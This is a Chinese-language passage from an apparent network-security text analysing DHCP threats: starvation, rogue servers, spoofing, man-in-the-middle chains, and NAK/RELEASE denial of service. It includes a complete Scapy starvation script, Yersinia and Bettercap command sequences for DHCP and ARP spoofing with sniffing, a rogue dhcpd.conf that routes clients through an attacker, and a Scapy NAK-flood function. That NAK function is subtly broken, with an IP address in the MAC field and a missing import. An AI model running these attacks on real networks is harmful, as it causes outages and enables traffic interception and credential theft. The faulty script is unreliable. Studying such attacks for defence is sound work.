# DHCP安全威胁分析

DHCP协议在设计之初未考虑安全认证机制，任何设备都可以发送DHCP报文，这导致了多种安全威胁。

### 2.1 DHCP饥饿攻击

**攻击原理**

DHCP饥饿攻击通过伪造大量不同MAC地址的DHCPDISCOVER请求，快速耗尽DHCP服务器地址池中的可用IP地址，导致合法用户无法获取IP地址。

```
攻击者                          DHCP服务器
  |                                |
  | DHCPDISCOVER (MAC: 00:00:00:00:00:01)  |
  |------------------------------->|
  |<-------------------------------|
  | DHCPOFFER (IP: 192.168.1.101)  |
  |                                |
  | DHCPREQUEST                    |
  |------------------------------->|
  |<-------------------------------|
  | DHCPACK (分配192.168.1.101)    |
  |                                |
  | DHCPDISCOVER (MAC: 00:00:00:00:00:02)  |
  |------------------------------->|
  |<-------------------------------|
  | DHCPOFFER (IP: 192.168.1.102)  |
  |                                |
  | ... 快速重复数百上千次 ...     |
  |                                |
  | 地址池耗尽                     |
  | 合法用户发送DISCOVER           |
  | 无OFFER返回                   |
  | 网络中断                      |
```

**攻击工具**

常用攻击工具包括：

- **Yersinia**：支持多种二层协议攻击，包括DHCP饥饿攻击
- **DHCPig**：Python编写的DHCP饥饿攻击工具
- **Scapy**：通过Python脚本自定义构造DHCP报文

Yersinia使用示例：

```bash
# 启动Yersinia交互模式
yersinia -I

# 选择DHCP攻击模式后选择"dhcp starvation attack"

# 命令行模式执行DHCP饥饿攻击
yersinia -attack 1 -interface eth0
```

Scapy构造DHCP饥饿攻击脚本：

```python
from scapy.all import *
import random

def mac_generator():
    """生成随机MAC地址"""
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(f'{b:02x}' for b in mac)

def dhcp_starvation(interface, count=100):
    """DHCP饥饿攻击"""
    for i in range(count):
        mac = mac_generator()
        # 构造以太网帧
        eth = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')
        # 构造IP/UDP层
        ip = IP(src='0.0.0.0', dst='255.255.255.255')
        udp = UDP(sport=68, dport=67)
        # 构造BOOTP层
        bootp = BOOTP(
            chaddr=bytes.fromhex(mac.replace(':', '')),
            xid=random.randint(1, 0xFFFFFFFF)
        )
        # 构造DHCP层
        dhcp = DHCP(options=[
            ('message-type', 'discover'),
            ('client_id', bytes.fromhex('01' + mac.replace(':', ''))),
            ('param_req_list', [1, 3, 6, 15, 28]),
            'end'
        ])
        # 发送报文
        packet = eth / ip / udp / bootp / dhcp
        sendp(packet, iface=interface, verbose=0)
        print(f'[{i+1}/{count}] 发送DHCPDISCOVER, MAC={mac}')

if __name__ == '__main__':
    dhcp_starvation('eth0', count=200)
```

**危害分析**

- 地址池耗尽导致合法用户无法获取IP地址
- 服务拒绝导致业务中断
- 如果服务器记录租约到持久化存储，可能导致数据库膨胀
- 攻击开销极低（单机即可），防御相对困难

### 2.2 伪造DHCP服务器攻击

**攻击原理**

攻击者在网络中部署伪造的DHCP服务器，向合法客户端提供错误的网络配置，包括错误的网关、DNS服务器等。

```
合法DHCP服务器(192.168.1.1)           攻击者
  |                                    |
  |                          伪造DHCP服务器(192.168.1.254)
  |                                    |
  |       DHCPDISCOVER (广播)          |
  |<-----------------------|-----------|
  |                        |           |
  | DHCPOFFER (正常配置)  | DHCPOFFER (恶意配置)
  | 网关:192.168.1.1      | 网关:192.168.1.254
  | DNS:8.8.8.8           | DNS:192.168.1.254
  |                       |           |
  |       客户端选择最先到达的OFFER       |
  |       通常攻击者不发送等待时间        |
  |       直接快速响应                 |
  |                       v           |
  |              客户端使用恶意配置      |
  |              所有流量经过攻击者      |
```

**伪造DHCP服务器搭建**

使用isc-dhcp-server搭建伪造服务器：

```
# /etc/dhcp/dhcpd.conf 配置文件
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.200 192.168.1.250;
    option routers 192.168.1.254;        # 恶意网关指向攻击者
    option domain-name-servers 192.168.1.254;  # 恶意DNS指向攻击者
    default-lease-time 600;
    max-lease-time 7200;
}
```

### 2.3 DHCP欺骗攻击

**攻击原理**

DHCP欺骗是伪造DHCP服务器攻击的扩展形式。攻击者通过快速响应DHCPDISCOVER来抢占先机，使客户端优先使用攻击者提供的配置。

DHCP欺骗攻击通常配合以下技术：

- **ARP毒化**：攻击者分配给自己的IP地址设为网关地址，然后通过ARP欺骗截获流量
- **DNS劫持**：恶意DNS服务器返回伪造的域名解析结果
- **SSL stripping**：在中间人位置降级HTTPS连接

**攻击流程**

```
1. 攻击者接入网络，启动伪造DHCP服务器
2. 客户端发送DHCPDISCOVER广播
3. 合法服务器和伪造服务器同时收到DISCOVER
4. 伪造服务器先发送DHCPOFFER（响应更快）
5. 客户端选择伪造服务器的OFFER
6. 客户端获取恶意网关和DNS
7. 客户端的所有网络流量经过攻击者
8. 攻击者进行中间人攻击、流量嗅探、数据篡改
```

### 2.4 中间人攻击

DHCP欺骗是局域网中间人攻击的重要入口。攻击链如下：

```
阶段1: DHCP欺骗
  - 部署伪造DHCP服务器
  - 客户端获取恶意配置
  - 网关指向攻击者

阶段2: 流量劫持
  - 客户端流量到达攻击者
  - 攻击者转发到真实网关
  - 客户端无感知

阶段3: 攻击载荷
  - HTTP流量劫持和篡改
  - SSL/TLS降级攻击
  - Cookie窃取
  - 凭证嗅探
  - 恶意软件投递
```

中间人攻击工具：

- **Bettercap**：综合中间人攻击框架
- **Ettercap**：经典ARP/DHCP欺骗工具
- **MITMf**：Python中间人攻击框架

Bettercap DHCP欺骗示例：

```bash
# 启动bettercap
sudo bettercap -iface eth0

# 设置DHCP欺骗
set dhcp.spoof on
set dhcp.spoof.gateway 192.168.1.254
set dhcp.spoof.dns 192.168.1.254
set dhcp.spoof.range.start 192.168.1.100
set dhcp.spoof.range.end 192.168.1.150

# 启动
dhcp.spoof on

# 同时启动ARP欺骗（增强效果）
set arp.spoof.targets 192.168.1.50
arp.spoof on

# 启动嗅探
net.sniff on
```

### 2.5 DHCP拒绝服务攻击

除了饥饿攻击外，DHCP还面临其他形式的DoS攻击：

**DHCP NAK攻击**

攻击者持续发送DHCPNAK报文，中断合法客户端的租约，导致客户端反复重新获取地址：

```python
from scapy.all import *
import time

def dhcp_nak_attack(target_mac, server_ip, interface):
    """DHCP NAK攻击"""
    eth = Ether(src=server_ip, dst=target_mac)
    ip = IP(src=server_ip, dst='255.255.255.255')
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(
        chaddr=bytes.fromhex(target_mac.replace(':', '')),
        siaddr=server_ip,
        xid=random.randint(1, 0xFFFFFFFF)
    )
    dhcp = DHCP(options=[
        ('message-type', 'nak'),
        ('server_id', server_ip),
        'end'
    ])
    packet = eth / ip / udp / bootp / dhcp
    sendp(packet, iface=interface, loop=1, inter=0.1)
```

**DHCPRELEASE攻击**

攻击者伪造客户端的MAC地址发送DHCPRELEASE报文，使服务器提前释放租约：

```
攻击者伪造合法客户端MAC -> 发送DHCPRELEASE -> 服务器释放地址 -> 客户端失去IP
```

### 2.6 攻击链组合分析

在实际攻击中，攻击者通常组合使用多种DHCP攻击技术：

```
攻击链1: DHCP饥饿 + 伪造服务器
  1. DHCP饥饿攻击耗尽合法服务器地址池
  2. 客户端无法从合法服务器获取地址
  3. 攻击者的伪造DHCP服务器响应请求
  4. 客户端使用恶意配置

攻击链2: DHCP欺骗 + ARP毒化 + 中间人
  1. DHCP欺骗使网关指向攻击者
  2. ARP毒化确保流量持续经过攻击者
  3. 攻击者执行中间人攻击
  4. 窃取凭证、注入恶意代码

攻击链3: DHCP攻击 + DNS劫持 + 钓鱼
  1. DHCP欺骗分配恶意DNS服务器
  2. 恶意DNS将银行域名解析到钓鱼网站
  3. 用户访问钓鱼网站
  4. 凭证被窃取
```

---

---

